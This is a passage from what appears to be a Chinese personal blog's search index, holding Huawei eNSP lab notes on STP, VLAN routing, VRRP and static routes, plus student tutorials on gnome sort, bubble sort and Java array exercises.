Root Primary 至此，配置完毕...... ","link":"https://Xing-Fax.GitHub.io/post/MSTP/"},{"title":"eNSP-STP实验","content":" 生成树协议： 通过对每台交换机执行STP Mode STP命令开启生成树协议 确定根桥 通过执行DisPlay STP查看各交换机的BID LSW1： -------[CIST Global Info][Mode STP]------- CIST Bridge :0 .4c1f-cc69-47eb ...... LSW2： -------[CIST Global Info][Mode STP]------- CIST Bridge :4096 .4c1f-cc54-4b04 ...... LSW3： -------[CIST Global Info][Mode STP]------- CIST Bridge :32768.4c1f-cca4-6f1b ...... LSW4： -------[CIST Global Info][Mode STP]------- CIST Bridge :32768.4c1f-cc89-1e2a ...... 通过查看BID，LSW1的桥优先级最小，LSW1成为根桥 确定根端口 通过比较非根桥与根桥路径开销，LSW2的E0/0/1和LSW3的E0/0/2与根桥之间开销最小，所以为根端口 判断LSW4，由于开销相同，判断上级LSW2和LSW3的BID，LSW2比LSW3小，所以选择LSW2 由于有两条线路，开销相同，通过判断上级端口PID，LSW2的E0/0/2比LSW2的E0/0/4要小 所以LSW4的E0/0/4为根端口，至此根端口判断完毕 确定指定端口 由于根桥下的所有端口都为指定端口，所以LSW1的E0/0/1和E0/0/2为根指定端口 通过判断开销 LSW3的E0/0/1与根开销最小，为指定端口 LSW2的E0/0/2和E0/0/4与根桥开销最小，为指定端口 确定阻塞端口 在确定根端口和指定端口后，拓扑结构中剩下的端口为阻塞端口，所以LSW4的E0/0/2和E0/0/1为阻塞端口 验证结果 通过执行DisPlay STP Brief命令查看交换机端口状态 LSW1： MSTID Port Role STP State Protection 0 Ethernet0/0/1 DESI FORWARDING NONE 0 Ethernet0/0/2 DESI FORWARDING NONE LSW2： MSTID Port Role STP State Protection 0 Ethernet0/0/1 ROOT FORWARDING NONE 0 Ethernet0/0/2 DESI FORWARDING NONE 0 Ethernet0/0/4 DESI FORWARDING NONE LSW3： MSTID Port Role STP State Protection 0 Ethernet0/0/1 DESI FORWARDING NONE 0 Ethernet0/0/2 ROOT FORWARDING NONE LSW4： MSTID Port Role STP State Protection 0 Ethernet0/0/1 ALTE DISCARDING NONE 0 Ethernet0/0/2 ALTE DISCARDING NONE 0 Ethernet0/0/4 ROOT FORWARDING NONE 经过验证，与猜想结果相同 ","link":"https://Xing-Fax.GitHub.io/post/STP/"},{"title":"eNSP-三层交换VLAN间路由","content":" 三层交换VLAN间路由 拓扑图： 要求： 修改主机名为拓扑显示的名称 创建VLAN 将相应的端口加入VLAN 相应的端口配置成Trunk VLANif接口配置成网络内最后一个可用IP地址 配置PC机的IP地址，测试不同VLAN的PC是否能正常通信 配置过程： LSW1: sys sys LSW1 un in e v b 10 20 int e0/0/10 p l a p d v 10 int e0/0/2 p l a p d v 10 int e0/0/1 p l t p t a v 10 20 LSW2: sys sys LSW2 un in e v b 10 20 int e0/0/3 p l a p d v 20 int e0/0/4 p l a p d v 20 int e0/0/1 p l t p t a v 10 20 LSW3: sys sys LSW3 un in e v b 10 20 int g0/0/1 p l t p t a v 10 20 int g0/0/2 p l t p t a v 10 20 int vlanif 10 ip add 192.168.100.62 26 int vlanif 20 ip add 192.168.200.62 26 测试连通性 PC1 PING PC3： PC&gt;ping 192.168.200.1 Ping 192.168.200.1: 32 data bytes, Press Ctrl_C to break From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable --- 192.168.100.62 ping statistics --- 5 packet(s) transmitted 0 packet(s) received 100.00% packet loss PC1 PING 网关地址： PC&gt;ping 192.168.100.254 Ping 192.168.100.254: 32 data bytes, Press Ctrl_C to break From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable From 192.168.100.1: Destination host unreachable --- 192.168.100.62 ping statistics --- 5 packet(s) transmitted 0 packet(s) received 100.00% packet loss LSW3路由表： [LSW3]dis ip routing-table Route Flags: R - relay, D - download to fib ------------------------------------------------------------------------------ Routing Tables: Public Destinations : 6 Routes : 6 Destination/Mask Proto Pre Cost Flags NextHop Interface 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0 192.168.100.192/26 Direct 0 0 D 192.168.100.254 Vlanif10 192.168.100.254/32 Direct 0 0 D 127.0.0.1 Vlanif10 192.168.200.192/26 Direct 0 0 D 192.168.200.254 Vlanif20 192.168.200.254/32 Direct 0 0 D 127.0.0.1 Vlanif20 ","link":"https://Xing-Fax.GitHub.io/post/VLANbetween/"},{"title":"eNSP-虚拟路由冗余协议","content":"虚拟路由冗余协议VRRP 是一种用于提高网络可靠性的容错协议。通过VRRP，可以在主机的下一跳设备出现故障时，及时将业务切换到备份设备，从而保障网络通信的连续性和可靠性。 网络拓扑： VRRP 配置： 按照拓扑显示修改主机名，配置IP地址,AR3和AR1、AR2级联的链路，AR3的端口配置第一个可用IP地址 AR1和AR3配置静态路由，AR2配置默认路由 配置VRRP备份组１，AR１为Master设备，优先级200，AR2为Backup设备，优先级150，VRRP备份组1的虚拟IP地址为192.168.1.253 配置VRRP备份组2：AR2为Master设备，优先级高于默认200，AR1为Backup设备，优先级150，VRRP备份组2的虚拟IP地址为192.168.1.254 配置Master的抢占延时时间为10秒。 Master配置VRRP的上行接口跟踪。如果DOWN,优先级降低60 配置过程： 1.配置IP AR1: int g0/0/0 ip add 1.1.1.2 30 int g0/0/1 ip add 192.168.1.251 24 AR2: int g0/0/0 ip add 2.2.2.2 30 int g0/0/1 ip add 192.168.1.252 24 AR3: int g0/0/0 ip add 1.1.1.1 30 int g0/0/1 ip add 2.2.2.1 30 int lo0 ip add 3.3.3.3 24 2.配置路由 AR1: ip route-static 3.3.3.3 24 1.1.1.1 AR3: ip route-static 192.168.1.0 24 1.1.1.2 ip route-static 192.168.1.0 24 2.2.2.2 静态路由 AR2: ip route-static 0.0.0.0 0.0.0.0 2.2.2.1 默认路由 3.启用OSPF AR1: ospf a 0 net 1.1.1.0 0.0.0.3 net 192.168.1.1 0.0.0.255 AR2: ospf a 0 net 2.2.2.0 0.0.0.3 net 192.168.1.0 0.0.0.255 AR3: ospf a 0 net 1.1.1.0 0.0.0.3 net 2.2.2.0 0.0.0.3 net 3.3.3.0 0.0.0.255 4.创建VRRP AR1: int g0/0/1 vrrp vrid 1 virtual-ip 192.168.1.253 vrrp vrid 1 priority 200 vrrp vrid 1 track int g0/0/0 reduced 60 vrrp vrid 2 virtual-ip 192.168.1.254 vrrp vrid 2 priority 150 vrrp vrid 1 preempt-mode timer delay 10 AR2: int g0/0/1 vrrp vrid 1 virtual-ip 192.168.1.253 vrrp vrid 1 priority 150 vrrp vrid 2 virtual-ip 192.168.1.254 vrrp vrid 2 priority 210 vrrp vrid 1 track int g0/0/0 reduced 60 vrrp vrid 2 preempt-mode timer delay 10 5.验证配置 PC1: PC&gt;ping 3.3.3.3 Ping 3.3.3.3: 32 data bytes, Press Ctrl_C to break Request timeout! From 3.3.3.3: bytes=32 seq=2 ttl=254 time=93 ms From 3.3.3.3: bytes=32 seq=3 ttl=254 time=79 ms From 3.3.3.3: bytes=32 seq=4 ttl=254 time=62 ms From 3.3.3.3: bytes=32 seq=5 ttl=254 time=62 ms --- 3.3.3.3 ping statistics --- 5 packet(s) transmitted 4 packet(s) received 20.00% packet loss round-trip min/avg/max = 0/74/93 ms PC2: PC&gt;ping 3.3.3.3 Ping 3.3.3.3: 32 data bytes, Press Ctrl_C to break Request timeout! From 3.3.3.3: bytes=32 seq=2 ttl=254 time=94 ms From 3.3.3.3: bytes=32 seq=3 ttl=254 time=78 ms From 3.3.3.3: bytes=32 seq=4 ttl=254 time=62 ms From 3.3.3.3: bytes=32 seq=5 ttl=254 time=63 ms --- 3.3.3.3 ping statistics --- 5 packet(s) transmitted 4 packet(s) received 20.00% packet loss round-trip min/avg/max = 0/74/94 ms 断开链路 PC1: PC&gt;ping 3.3.3.3 Ping 3.3.3.3: 32 data bytes, Press Ctrl_C to break Request timeout! From 3.3.3.3: bytes=32 seq=2 ttl=254 time=78 ms From 3.3.3.3: bytes=32 seq=3 ttl=254 time=93 ms From 3.3.3.3: bytes=32 seq=4 ttl=254 time=79 ms From 3.3.3.3: bytes=32 seq=5 ttl=254 time=93 ms --- 3.3.3.3 ping statistics --- 5 packet(s) transmitted 4 packet(s) received 20.00% packet loss round-trip min/avg/max = 0/85/93 ms 依然可以正常通信，散花~ ","link":"https://Xing-Fax.GitHub.io/post/VRRP/"},{"title":"eNSP-静态路由","content":" 静态路由 网络拓扑结构 配置要求 配置主机名为拓扑图中显示的名称 按照拓扑中的地址给对应的接口配置IP地址，Lo0接口配置网络内最后一个可用IP地址 按下面要求配置静态路由 当192.168.20.0/24访问192.168.30.0/24时，数据从AR2到AR3 当192.168.20.0/24访问192.168.10.0/24时，数据从AR2经过AR3再到AR1，返回的路由都是从AR3到AR2 配置IP AR1 int g0/0/0 ip add 192.168.1.0 24 int g0/0/1 ip add 192.168.2.1 24 int lo0 ip add 192.168.10.254 24 AR2 int g0/0/0 ip add 192.168.3.2 24 int g0/0/1 ip add 192.168.1.2 24 int lo0 ip add 192.168.20.254 24 AR3 int g0/0/0 ip add 192.168.3.3 24 int g0/0/1 ip add 192.168.2.3 24 int lo0 ip add 192.168.30.254 24 添加静态路由 AR1 ip route-static 192.168.3.0 24 192.168.2.3 ip route-static 192.168.20.0 24 192.168.2.3 ip route-static 192.168.30.0 24 192.168.2.3 AR2 ip route-static 192.168.2.0 24 192.168.3.3 ip route-static 192.168.30.0 24 192.168.3.3 ip route-static 192.168.10.0 24 192.168.3.3 AR3 ip route-static 192.168.10.0 24 192.168.2.1 ip route-static 192.168.20.0 24 192.168.3.2 ","link":"https://Xing-Fax.GitHub.io/post/start/"},{"title":"eNSP-三层交换机实现VRRP","content":" 三层交换机实现VRRP 三层交换机使用VRRP(热备冗余网关）技术，VRRP(虚拟路由冗余协议)可以保证在双机热备的网络中，不会出现单点故障的情况，能够很好的保护网络数据流通 网络拓扑： 三层交换机实现VRRP： 按拓扑修改主机名，配置IP地址 AR1和LSW 1配置静态路由，LSW2配置默认路由 创建VLAN，配置VLANif 接口，适当的接口配置成Trunk，适当的接口配置为Access VRRP备份组１，虚拟IP192.168.1.254/24,LSW1为Master设备，优先级200，LSW2为Backup设备，优先级150 VRRP备份组2，虚拟IP192.168.2.254/24,LSW2为Master设备，优先级200，LSW1为Backup设备，优先级150 延时配置Master的抢占时间为10秒 配置VRRP的上行接口跟踪，如果down,降低优先级60 测试PC1和2.2.2.2的连通性 配置过程： 1.配置链路 LSW1: vlan batch 10 20 30 int e0/0/1 p l a p d v 30 inr e0/0/2 p l t p t a v 10 20 LSW2: vlan batch 10 20 40 int e0/0/1 p l a p d v 40 inr e0/0/2 p l t p t a v 10 20 LSW3: vlan batch 10 20 int e0/0/1 p l t p t a v 10 20 int e0/0/2 p l t p t a v 10 20 int e0/0/3 p l a p d v 10 int e0/0/4 p l a p d v 20 2.配置IP AR1: int g0/0/0 ip add 1.1.1.1 30 int g0/0/1 ip add 3.3.3.1 30 int lo0 ip add 2.2.2.2 24 3.配置路由 LSW1: ip route-static 2.2.2.0 24 1.1.1.1 LSW2: ip route-static 0.0.0.0 0.0.0.0 3.3.3.1 AR1 ip route-static 192.168.1.0 24 1.1.1.2 ip route-static 192.168.1.0 24 3.3.3.2 ip route-static 192.168.2.0 24 1.1.1.2 ip route-static 192.168.2.0 24 3.3.3.2 4.启用OSPF LSW1: ospf a 0 net 192.168.1.0 0.0.0.255 net 192.168.2.0 0.0.0.255 net 1.1.1.0 0.0.0.3 LSW2: ospf a 0 net 192.168.1.0 0.0.0.255 net 192.168.2.0 0.0.0.255 net 3.3.3.0 0.0.0.3 AR1: ospf a 0 net 1.1.1.0 0.0.0.3 net 3.3.3.0 0.0.0.3 net 2.2.2.0 0.0.0.255 5.创建VRRP LSW1: int vlan 10 ip add 192.168.1.252 24 vrrp vrid 1 virtual-ip 192.168.1.254 vrrp vrid 1 priority 200 vrrp vrid 1 track interface e0/0/1 reduced 60 vrrp vrid 1 preempt-mode timer delay 10 int vlan 20 ip add 192.168.2.252 24 vrrp vrid 2 virtual-ip 192.168.2.254 vrrp vrid 2 priority 150 vrrp vrid 2 track interface e0/0/1 reduced 60 int vlan 30 ip add 1.1.1.2 30 LSW2: int vlan 10 ip add 192.168.1.253 24 vrrp vrid 1 virtual-ip 192.168.1.254 vrrp vrid 1 priority 150 vrrp vrid 1 track interface e0/0/1 reduced 60 int vlan 20 vrrp vrid 2 virtual-ip 192.168.2.254 vrrp vrid 2 priority 200 vrrp vrid 2 track interface e0/0/1 reduced 60 vrrp vrid 2 preempt-mode timer delay 10 int vlan 40 ip add 3.3.3.2 30 6.验证配置 PC1: PC&gt;ping 2.2.2.2 Ping 2.2.2.2: 32 data bytes, Press Ctrl_C to break From 2.2.2.2: bytes=32 seq=1 ttl=254 time=156 ms From 2.2.2.2: bytes=32 seq=2 ttl=254 time=125 ms From 2.2.2.2: bytes=32 seq=3 ttl=254 time=94 ms From 2.2.2.2: bytes=32 seq=4 ttl=254 time=141 ms From 2.2.2.2: bytes=32 seq=5 ttl=254 time=125 ms --- 2.2.2.2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 94/128/156 ms PC1与2.2.2.2通信正常，散花🎉 ","link":"https://Xing-Fax.GitHub.io/post/vlanVRRP/"},{"title":"排序算法-地精排序","content":"什么是地精排序？ 📝地精排序(Gnome)，也称侏儒排序 和冒泡排序相类似，比较相邻元素，在决定是否交换，类似于插入算法，但是地精排序的特点是，只需要一层循环即可完成排序，能有效的减少交换的回合数 为什么叫地精排序？ 地精排序在2000年由Dr. Hamid Sarbazi-Azad 提出的时候被称作 Stupid Sort，可见其思想的简单性。后来，这个算法被Dick Grune 描述成地精排序Gnome Sort ​ Here is how a garden gnome sorts a line of flower pots. Basically, he looks at the flower pot next to him and the previous one; if they are in the right order he steps one pot forward, otherwise he swaps them and steps one pot backwards. Boundary conditions: if there is no previous pot, he steps forwards; if there is no pot next to him, he is done. —Dick Grune 💕这就是萌萌哒的Gnome(Tuinkabouter) 算法思想 可以看作冒泡排序的简化版，冒泡排序是将元素不断的上浮，而地精排序是出现需要交换的元素时往回推，直到到达数组头部，或者无任何交换 先定义一个用于测试的数组📌 int[] Arr = {12,26,58,20,14,10,23,45,48,10,95,13}; 这里需要判断是要前进还是后退，所以先定义一个移动指针 index 初始化为1 int index = 1; 然后使用 While 做循环体，当 index 超过数组大小的时候代表已经移动到末尾，证明数组已经排序完毕 while(index &lt; Arr.length){ //判断/交换 } 判断这里就很简单，只需要判断当前元素是否小于上一个元素即可，但是要注意如果 index 等于0时，在减1下标就变成了-1，所以提前判断 index 是否大于0😮 if(index &gt; 0 &amp;&amp; Arr[index] &lt; Arr[index - 1]){ //交换 Arr[index] &amp; Arr[index - 1] index--; } else{ index++; } 这里的交换数据格式不固定，可以按照使用习惯来写😊 可以看到算法很简练，当出现交换数据时 移动指针就 - 1 否则 + 1 最后验证一下交换后的数组😋 for(int i = 0;i &lt; Arr.length ;i++){ System.out.print(Arr[i] + &quot; &quot;); } //10 10 12 13 14 20 23 26 45 48 58 95 完整代码： int[] Arr = {12,26,58,20,14,10,23,45,48,10,95,13}; int index = 1; while(index &lt; Arr.length){ if(index &gt; 0 &amp;&amp; Arr[index] &lt; Arr[index - 1]){ Arr[index - 1] = Arr[index - 1] + Arr[index]; Arr[index] = Arr[index - 1] - Arr[index]; Arr[index - 1] = Arr[index - 1] - Arr[index]; index--; } else{ index++; } } for(int i = 0;i &lt; Arr.length ;i++){ System.out.print(Arr[i] + &quot; &quot;); } 完美散花~🎉 算法扩展 算法复杂度： 最差情况：T(n)=O(n2)最差情况 ：T(n) = O(n^2) 最差情况：T(n)=O(n2) 最好情况：T(n)=O(n)最好情况：T(n) =O(n) 最好情况：T(n)=O(n) 最后： 虽然地精排序被归为奇葩排序之一，但也有一定的应用场景，如在元素大部分有序的情况下，地精排序可以有效的减少排序的循环回合数🎉🎉🎉 ","link":"https://Xing-Fax.GitHub.io/post/goblin-sort/"},{"title":"JAVA 练习题","content":"随手写的课后练习题😋 题目一 📝请创建一个长度为6的整数数组，并为数组中的元素赋值，然后遍历数组，打印所有元素，元素之间用空格隔开 ✏依题意先定义数值： int[] Arr = new int[6]; ✏然后使用For循环为数组初始化赋值： for(int i = 0;i &lt; Arr.length;i++){ Arr[i] = i; } ✏最后打印注意使用空格隔开 for(inti = 0 ;i &lt; Arrlength;i++){ System.out.print(Arr[i] + &quot; &quot;); } 最后完美散花🎉 源码✨： int[] Arr = new int[6]; for(int i = 0; i &lt; Arr.length; i++) Arr[i] = i; for(int i = 0; i &lt; Arr.length; i++) System.out.println(Arr[i] + &quot; &quot;); 题目二 📝现有一个小数数组{12.9, 53.54, 75.0, 99.1, 3.14}请编写代码，找出数组中的最小值并打印 ✒数组中的元素含有小数，所以使用Double类型(别问为什么不用float) double[] Arr = {12.9, 53.54, 75.0, 99.1, 3.14} ✒先认为数组中的下标0元素是最小的 double Min = Arr[0]; ✒然后循环判断，如果下一个元素小于我们上面认为最小的元素，那么就重新对Min进行赋值 for(int i = 1; i &lt; Arr.length;i++) if(Min &gt; Arr[i]) Min = Arr[i]; 这里的For循环之所以初始化从1开始，是因为0号元素以及被我们认定为最小值，所以就不用与自身做比较 🎉最后输出结果就完成啦~ System,out.println(&quot;最小值：&quot; + Min); 源码✨： double[] Arr = {12.9,53.54,75.0,99.1,3.14}; double Min = Arr[0]; for(int i = 1; i &lt; Arr.length ; i++) if(Min &gt; Arr[i]) Min = Arr[i]; System.out.println(&quot;最小值：&quot; + Min); 题目三 📝创建一个长度为6的整数数组，随机生成六个0(包含) - 100(不包含)之间的整数存放到数组中，然后计算出数组中所有元素的和并打印 🖋依题意，先定义一个元素个数为6的数组 int[] Arr = new Arr[6]; 🖋然后要求生成随机数，且指定范围为 [0,100)，在这里我们使用Eandom类，它实现的随机算法是伪随机，也就是有规则的随机，需要为它传入一个种子数，然后再次基础上生成随机数 🖋所以先定义Random对象 Random Ran = new Random(); 不要忘记导入import java.util.Random 🖋由于题目要求计算数组的和，所以再定义一个变量Sum，用于存放计算和 int Sum = 0; 🖋使用For循环为每一个元素赋值，依题意将种子数设为100，生成的数范围在0 - 99中 for(int i = 0; i &lt; Arr.length ;i ++) Arr[i] = Ran.nextInt(100); 🖋用For循环计算数组的每一位之和，最后打印输出就可以啦~🎉 for(int i = 0; i &lt; Arr.length; i++) Sum += Arr[i]; System.out.println(&quot;数组之和为：&quot; + Sum); 源码✨： //import java.util.Random; int[] Arr = new int[6]; Random Ran = new Random(); int Sum = 0; for(int i = 0; i &lt; Arr.length ;i ++) Arr[i] = Ran.nextInt(100); for(int i = 0; i &lt; Arr.length; i++) Sum += Arr[i]; System.out.println(&quot;数组之和为：&quot; + Sum); 题目四 📝现有一个整数数组，数组中的每个元素都是[0-9]之间的数字，从数组的最大索引位置开始到最小索引位置，依次表示整数的个位、十位、百位... 依次类推，请编写程序计算，这个数组所表示的整数值 📌先定义数组，然后使用随机数填充(这里就不展开介绍了) int[] Arr = new int[6]; Random Ran = new Random(); for(int i = 0; i &lt; Arr.length; i++) Arr[i] = Ran.nextInt(10); 需要注意，每一位的数字在 0 - 9 范围内 📌然后将数组的内容逐位输出就好啦~ for(int i = 0; i &lt; Arr.length; i++) { System.out.print(Arr[i]); 源码✨： int[] Arr = new int[6]; Random Ran = new Random(); for(int i = 0; i &lt; Arr.length; i++) Arr[i] = Ran.nextInt(10); System.out.print(&quot;这个数是：&quot;); for(int i = 0; i &lt; Arr.length; i++) System.out.print(Arr[i]); 题目五 📝一个数组，其中有十个元素从小到大依次排列{12,14,23,45,66,68,70,77,90,91}再通过键盘录入一个整数数字 要求：把数字放入数组序列中，生成一个新的数组，并且数组的元素依旧是从小到大排列的 🎯题目要求输入数据，所以我们使用Scanner //import java.util.Scanner; Scanner Scan = new Scanner(System.in); 🎯在定义题目中已知的数组,由于要产生一个新数组，所以在定义一个比题目中大1的数组(因为插入的数据需要占用1位) int[] Arr1 = {12,14,23,45,66,68,70,77,90,91}; int[] Arr2 = new int[Arr1.length + 1]; 🎯然后键盘输入 System.out.print(&quot;输入值：&quot;); int In = Scan.nextInt(); Scan.close(); 🎯题目中要求插入后的数组仍然是从小到大排列，所以我们就要去查找插入点，而不是在末尾插入 int Ma = 0; //寻找插入点并插入 for(Arr2[Ma] = In ; Ma &lt; Arr1.length ; Arr2[++Ma] = In) if(In &lt;= Arr1[Ma]) break; 🎯For循环中三个语句块，其中第一个会首先执行一遍，一般用于循环变量的定义 🎯在考虑到最坏的情况是一次也没有执行，所以先将用户输入的数值放到头部 🎯第二个语句块中是结束循环的条件，这里为数组的长度，在循环之前也会检查是否符合条件，不符合就不会执行 🎯第三个语句块中会For语句块中的代码执行一遍后执行，由于For语句块中的代码含有break，如果在此次循环中没有跳出，那么说明其中if条件不成立，证明用户输入的数值大于当前数组中的值，在这里做前++后，并赋值，继续下一次循环，如果if条件成立，for循环被break，那么说明用户输入的数值大于数组当前的值，所以跳出循环，第三个语句块也不会被执行，仍然保留上一次的执行结果 🎯这个时候用户输入的数据已经被插入到了新数组中，但是仍然缺少原数组中的值，所以要将原数组从指定位置分割，依次填充前面的数据和后面的数据 //填充前数据 for(int i = 0 ; i &lt; Ma ; Arr2[i] = Arr1[i++]); 🎯这里填充前数据的末尾在刚刚得到的插入点Ma //填充后数据 for(Ma++ ; Ma &lt; Arr2.length ; Arr2[Ma] = Arr1[Ma++ - 1]); 🎯既然Ma为插入点，直接从Ma后插入数据 🎯最后验证结果 System.out.println(&quot;插入前：&quot; + Arrays.toString(Arr1)); System.out.println(&quot;插入后：&quot; + Arrays.toString(Arr2)); 源码✨： Scanner Scan = new Scanner(System.in); int[] Arr1 = {12,14,23,45,66,68,70,77,90,91}; int[] Arr2 = new int[Arr1.length + 1]; //输入数据 System.out.print(&quot;输入值：&quot;); int In = Scan.nextInt(); int Ma = 0; Scan.close(); //寻找插入点并插入 for(Arr2[Ma] = In ; Ma &lt; Arr1.length ; Arr2[++Ma] = In) if(In &lt;= Arr1[Ma]) break; //填充前后数据 for(int i = 0 ; i &lt; Ma ; Arr2[i] = Arr1[i++]); for(Ma++ ; Ma &lt; Arr2.length ; Arr2[Ma] = Arr1[Ma++ - 1]); //验证结果 System.out.println(&quot;插入前：&quot; + Arrays.toString(Arr1)); System.out.println(&quot;插入后：&quot; + Arrays.toString(Arr2)); 😋完美散花~ ","link":"https://Xing-Fax.GitHub.io/post/practise/"},{"title":"排序算法-冒泡排序","content":"前言：什么是冒泡排序？ 📝冒泡排序(Bubble Sort)，是一种计算机科学领域的较简单的排序算法 它重复地走访过要排序的元素列，依次比较两个相邻的元素，如果顺序（如从大到小、首字母从Z到A）错误就把他们交换过来。走访元素的工作是重复地进行，直到没有相邻元素需要交换，也就是说该元素列已经排序完成 这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端（升序或降序排列），就如同碳酸饮料中二氧化碳的气泡最终会上浮到顶端一样，故名“冒泡排序” 引用于 百度百科-冒泡排序 📖 算法思想： 冒泡排序，最核心的地方在于将数组内的相邻元素去比较大小，如果前一个元素大于后一个元素，那么就将他俩相互交换，然后在和后面的所有元素依次比较，直到将数组内的所有元素排序好😮 下面使用动图来解释一下这个排序的具体过程📟 算法实现： 当每执行一趟后就得到了数组中的一个最大值，这个值会在与相邻元素比较下，不断的向后移，直到移动到最后面，此时就确定了一个相对大的数值😋 但是这个远远不够，我们的目标是将数组内的所有元素依次从小到大排列🤔 所以我们要定义两个循环，一个用于去找数组内的相对最大值，而另一个是用于外层循环，来确定要循环的次数🤨 //java代码 for (int i = 1 ;i &lt; Arr.length ;i++) { //外层循环 for(int j = 0 ;j &lt; Arr.length - i ;j++) {//内层循环 //判断和交换... } } 外层循环作用是帮助内层循环去依次比较相邻元素，如果没有外层循环程序就变成了找数组的最大值😅 此格式基本是固定格式，即外层循环和内层循环的终值为数组元素的个数，但上述代码的内层循环却做了 - i 操作🤔 这里之所以使用Arr.length - i是因为每次找到的最大值都会被交换到数组末尾，所以数组末尾已经是一个定值，也就是我们这一遍找到的相对最大值，所以使用 - i 的方式可以减少计算量，提高执行速度😀 接下来是判断相邻元素是否大于前面的元素 //java代码 if (Arr[j] &gt; Arr[j + 1]) {//判断相邻元素是否大于前面的元素 //交换数据 } 即内层循环的变量 j 假如 j 是 2 那么相邻元素是 3 即 Arr[2] 的相邻元素是 Arr[3] 写成条件就是 Arr[j] &gt; Arr[j + 1] 其中的 j 为内层循环的变量😁 到这里就差交换两个元素就可以完成算法的编写了，接下来会介绍四种交换方式 1.中间变量法 int A = 10; //定义要交换的两个变量 int B = 20; /*-----------------------*/ int Temp = 0; //定义临时变量 Temp = A; //临时存放变量A A = B; //先将B的数给A B = Temp; //Temp存放的是交换前的A //完成交换 优点：简单易懂✨ 2.数学运算法 int A = 10; //定义要交换的两个变量 int B = 20; /*-----------------------*/ A = A + B; //将AB叠加-&gt; 10 + 20 = 30 B = A - B; //A - B -&gt; 30 - 20 = 10 A = A - B; //A - B -&gt; 30 - 10 = 20 //完成交换 优点：节省内存✨ 3.异或法 int A = 10; //定义要交换的两个变量 int B = 20; /*-----------------------*/ A = A ^ B; //A ^ B = 30 B = A ^ B; //A ^ B = 10 A = A ^ B; //A ^ B = 20 //完成交换 这里解释一下10的二进制是 0000 1010 ，20的二进制是 0001 0100 10 ^ 20 = 0000 1010 ^ 0001 1110 -&gt; 0001 1110 = 30 30 ^ 20 = 0001 1110 ^ 0001 0100 -&gt; 0000 1010 = 10 30 ^ 10 = 0001 1110 ^ 0000 1010 -&gt; 0001 0100 = 20 注：此方法只适用于整数📌 4.特殊法 int A = 10; //定义要交换的两个变量 int B = 20; /*-----------------------*/ B = A + B - (A = B); //交换完成 我们对B = A + B - (A = B) 进行编译后，在反编译 可以看到如下代码 int X = A + B B = A A = X - A 为了简洁明了我们使用第一种方法来作为我们冒泡排序的交换方式🖋(中间变量法) int a = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = a; 交换完成后，内层循环会去判断下一个相邻元素，这样依此类推...✏ 完整代码： 以Java为例，奉上完整代码🎉 //Java代码 package Project; public class Universal { public static void main(String[] args) { int[] arr = {4,2,8,0,5,7,1,3,9,10}; for (int i = 1 ;i &lt; arr.length ;i++) { for(int j = 0 ;j &lt; arr.length - i ;j++) { if (arr[j] &gt; arr[j + 1]) { int a = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = a; } } } for(int i = 0; i &lt; arr.length ;i++) { System.out.print(arr[i] + &quot; &quot;); } } } 算法扩展： 1.时间复杂度： 若文件的初始状态是正序的，一趟扫描即可完成排序。所需的关键字比较次数 C 和记录移动次数 M 均达到最小值 Cmin=n−1,Mmin=0Cmin = n-1,Mmin=0 Cmin=n−1,Mmin=0 所以冒泡排序最好的时间复杂度为 O(n) 若初始文件是反序的，需要进行 n - 1 趟排序，每趟排序要进行 n - i 次关键字的比较 (1≤i≤n-1) 且每次比较都必须移动记录三次来达到交换记录位置。在这种情况下，比较和移动次数均达到最大值 Cmax=n(n−1)2=O(n2)Cmax=\\frac {n(n-1)}{2} = O(n^2) Cmax=2n(n−1)​=O(n2) Mmax=3n(n−1)2=O(n2)Mmax=\\frac {3n(n-1)}{2} = O(n^2) Mmax=23n(n−1)​=O(n2) 所以冒泡排序最坏的时间复杂度是 O(n²) 2.实现方式： #include&lt;stdio.h&gt; int main(void) { int arr[10]={4,2,8,0,5,7,1,3,9,10}; for(int i=0;i&lt;9;i++) { for(int j=0;j&lt;9-i;j++) { if(arr[j]&gt;arr[j + 1]) { int temp =arr[j]; arr[j]= arr[j + 1]; arr[j + 1] = temp; } } } for(i=0;i&lt;10;i++) { printf(&quot;%d &quot;,arr[i]); } } C 语言实现冒泡排序示例代码 👆 #include &lt;iostream&gt; using namespace std; int main() { int arr[] = {4,2,8,0,5,7,1,3,9,10}; int end = sizeof(arr) / sizeof(arr[0]) - 1; for (int i = 0; i &lt; end; i++) { for (int j = 0; j &lt; end - i; j++) { if (arr[j] &gt; arr[j + 1]) { int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } for (int i = 0; i &lt;= end; i++) { cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;; } system(&quot;pause&quot;); return 0; } C++ 语言实现冒泡排序示例代码 👆 public class Demo{ public static void main(String args []) { int [] arr = new int[10]{4,2,8,0,5,7,1,3,9,10}; for(int i = 0;i &lt; arr.length - 1;i ++) { for(int j = 0;j &lt; arr.length - i - 1;j ++) { if(arr[j] &gt; arr[j + 1]) { int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; } } } for(int i = 0;i &lt; arr.length;i ++) { Console.WriteLine(arr[i].ToString()); } } } C# 语言实现冒泡排序示例代码 👆 def bubble(bubbleList): listLength = len(bubbleList) while listLength &gt; 0: for i in range(listLength - 1): if bubbleList[i] &gt; bubbleList[i+1]: bubbleList[i], bubbleList[i+1] = bubbleList[i+1], bubbleList[i] listLength -= 1 print bubbleList if __name__ == '__main__': bubbleList = [4,2,8,0,5,7,1,3,9,10] bubble(bubbleList) Python 语言实现冒泡排序示例代码 👆 DATAS SEGMENT DATA1 DW 4,2,8,0,5,7,1,3,9,10 DATAS ENDS CODES SEGMENT ASSUME CS:CODES,DS:DATAS START: MOV AX,DATAS MOV DS,AX MOV CX,9 ONE: MOV SI,0 CMP CX,0 JE EXIT DEC CX MOV BX,CX ADD BX,CX TWO: MOV AX,DATA1[SI] CMP AX,DATA1[SI+2] JLE 